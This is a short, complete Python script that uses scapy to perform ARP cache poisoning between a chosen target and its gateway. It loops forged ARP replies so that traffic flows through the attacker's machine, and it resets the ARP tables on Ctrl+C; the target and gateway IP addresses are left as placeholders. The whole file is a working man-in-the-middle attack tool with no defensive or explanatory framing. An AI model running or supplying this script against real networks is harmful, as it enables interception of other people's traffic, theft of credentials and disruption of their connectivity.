#!/usr/bin/env python
import sys
import time
import scapy.all as scapy

def getMAC(IP):
    arp_request = scapy.ARP(pdst = IP)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_IP, spoof_IP):
    target_mac = getMAC(target_IP)
    packet = scapy.ARP(op = 2, pdst = target_IP, hwdst = target_mac, psrc = spoof_IP)
    scapy.send(packet, verbose = False)

def restore(destination_IP, source_IP):
    destination_MAC = getMAC(destination_IP)
    source_MAC = getMAC(source_IP)
    packet = scapy.ARP(op = 2, pdst = destination_IP, hwdst = destination_MAC, psrc = source_IP, hwsrc = source_MAC)
    scapy.send(packet, count = 4, verbose = False)

target_IP = "yourtargetip"
gateway_IP = "yourgatewayip"

try:
    sent_packets_count = 0
    while True:
        spoof(target_IP, gateway_IP)
        spoof(gateway_IP, target_IP)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Resetting ARP tables.... Please wait.")
    restore(target_IP, gateway_IP)
    restore(gateway_IP, target_IP)